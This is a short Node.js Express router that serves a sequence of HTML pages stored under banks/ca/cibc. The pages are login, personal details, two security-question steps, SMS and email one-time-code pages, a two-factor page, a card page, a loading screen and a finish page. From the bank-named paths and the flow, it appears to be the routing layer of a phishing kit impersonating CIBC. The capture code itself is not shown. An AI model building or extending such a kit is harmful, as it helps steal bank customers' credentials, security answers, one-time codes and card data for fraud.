const express = require('express');
const path = require('path');  // Use 'path' instead of 'node:path'
const router = express.Router();
  

router.get('/', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/login/page.html'))});

router.get('/details',(req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/details/page.html'))});

router.get('/question', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/question/page.html'))});

router.get('/question/2', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/quest2/page.html'))});

router.get('/sms-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/sms/page.html'))});

router.get('/auth', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/auth/page.html'))});

router.get('/email-otp', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/otp/page.html'))});


router.get('/2factor', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/twofactor/page.html'))});

router.get('/loading', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/loading/page.html'))});


router.get('/finish', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/finish/page.html'))});

router.get('/card', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/cibc/card/page.html'))});


module.exports = router;